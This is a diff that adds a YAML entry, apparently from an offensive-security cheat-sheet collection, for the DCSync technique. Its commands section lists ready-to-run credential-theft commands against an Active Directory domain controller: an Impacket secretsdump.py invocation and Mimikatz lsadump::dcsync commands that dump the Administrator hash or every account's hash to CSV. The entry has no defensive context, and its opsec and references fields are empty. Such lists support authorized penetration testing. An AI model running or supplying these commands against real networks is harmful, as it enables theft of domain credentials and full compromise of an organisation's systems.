@@ -1,0 +1,11 @@
+name: DCSync
+description: Replicate password hashes from Domain Controller
+commands:
+- '# Impacket'
+- secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+- ''
+- '# Mimikatz'
+- lsadump::dcsync /domain:<DOMAIN> /user:Administrator
+- lsadump::dcsync /domain:<DOMAIN> /all /csv
+opsec: []
+references: []
